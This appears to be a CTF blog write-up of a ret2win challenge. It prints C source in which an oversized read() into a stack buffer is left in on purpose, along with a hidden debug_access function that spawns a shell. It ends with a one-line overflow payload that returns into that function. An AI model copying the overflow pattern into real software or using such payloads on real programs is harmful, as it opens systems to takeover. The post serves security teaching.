---

layout: post
title: LazyNano
date: 06/06/2025
categories: [ctf, pwn]
tag: [pwn, ctf]
author: Paw
description: ret2win

---


```C
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void menu() {
    puts("      __                                                                     ");
    puts("     /\\ \\                                                                  ");
    puts("    /  \\ \\      .--------------------------------------------------------. ");
    puts("   / /\\ \\ \\     |░█▀▄░█▀▀░█▀▀░█▀▀░░░█▀▀░█▀█░█▀█░█▀▀░█▀█░█░░░█▀▀░░░█░█░▀█░|");
    puts("  / / /\\ \\ \\    |░█░█░█░█░▀▀█░█░█░░░█░░░█░█░█░█░▀▀█░█░█░█░░░█▀▀░░░▀▄▀░░█░|");
    puts(" / / /__\\_\\ \\   |░▀▀░░▀▀▀░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀|");
    puts("/ / /________\\  '--------------------------------------------------------'  ");
    puts("\\/___________/                                                              ");
}

void debug_access(void) {
    puts("Accès à l'interface de debogage...");

    __asm__(
        ".intel_syntax noprefix;"
        "push 0x0;"
        ".att_syntax;"
    );
    
    system("/bin/sh");
    return;
}

void take_command() {
    char command[0x100];
    
    printf("> ");
    read(0, command, 0x130);
    printf("Commande inconnue\n");
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    menu();

    printf("Terminal de contrôle à distance de la base martienne Fermat\n");

    while (1) {
        take_command();
    }

    return 0;
}
```
> In this challenge the source code was given


We can some function called `debug_access`, it's a ret2win challenge. 

In a ret2win challenge you just have to find the offset to crush the EIP/RIP and return the function address.
> offset + return adress

```bash
gorfou-en-danger-1 readelf -s ./chall| grep "debug"
    42: 00000000004004fd    29 FUNC    GLOBAL DEFAULT    4 debug_access
```
so we just have to put the address in little endian 
debug adress in little endian : `\xfd\x04@\x00\x00\x00\x00\x00`
solution : 
```bash
(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xfd\x04@\x00\x00\x00\x00\x00";cat) | ./chall
```